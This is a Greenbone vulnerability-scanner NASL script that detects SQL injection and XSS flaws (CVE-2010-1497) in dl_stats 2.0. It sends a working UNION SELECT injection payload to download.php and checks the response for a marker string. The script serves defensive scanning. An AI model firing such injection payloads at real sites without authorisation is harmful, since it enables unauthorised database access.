# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100591");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2010-04-21 13:10:07 +0200 (Wed, 21 Apr 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2010-1497");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("dl_stats <= 2.0 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"dl_stats is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - SQL injection (SQLi)

  - Multiple cross-site scriptings (XSS)");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to steal
  cookie-based authentication credentials, control how the site is rendered to the user, compromise
  the application, access or modify data or exploit latent vulnerabilities in the underlying
  database.");

  script_tag(name:"affected", value:"dl_stats version 2.0 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39592");
  script_xref(name:"URL", value:"http://dl.clausvb.de/view_file.php?id=10");
  script_xref(name:"URL", value:"http://www.xenuser.org/2010/04/18/dl_stats-multiple-vulnerabilities-sqli-xss-unprotected-admin-panel/");
  script_xref(name:"URL", value:"http://www.xenuser.org/documents/security/dl_stats_multiple_vulnerabilities.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/dl_stats", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/download.php");
  if (res !~ "^HTTP/1\.[01] 200")
    continue;

  url = dir + "/download.php?id=2+AND+1=2+UNION+SELECT+1,2,3,4,0x53514c2d496e6a656374696f6e2d54657374--";

  if (http_vuln_check(port: port, url: url, pattern: "SQL-Injection-Test")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
